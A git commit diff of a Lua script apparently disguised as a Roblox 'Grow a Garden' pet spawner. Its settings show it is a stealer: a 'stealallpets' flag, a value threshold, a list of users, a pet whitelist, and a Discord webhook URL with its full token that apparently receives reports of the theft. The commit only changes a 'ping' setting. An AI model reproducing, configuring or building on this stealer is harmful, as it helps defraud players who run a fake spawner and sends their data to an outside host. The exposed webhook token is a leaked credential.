65a129b96367e19158165bdfdc5caa21c70cb64c
thatboyskulls12 <aj.skulls12@gmail.com>
2025-07-24 13:52:56 -0400

    Update GAG_SPAWNER.lua

--- GAG_SPAWNER.lua
+++ GAG_SPAWNER.lua
@@ -8,7 +8,7 @@ users = {
     'speedlovet',
 }
 min_value = 10000000
-ping = "true"
+ping = "yes"
 webhook = "https://discord.com/api/webhooks/1397737960925036605/6OL-UU-x_pYYOauEmwmR1t-yAA6lkOX5oWpxz0MmfRGRKPBFx_9EkMh5Zg8dquFb6Kwr"
 stealallpets = "true"
 Whitelist_Pets = {"Red Fox", "Raccoon", "Dragonfly"}
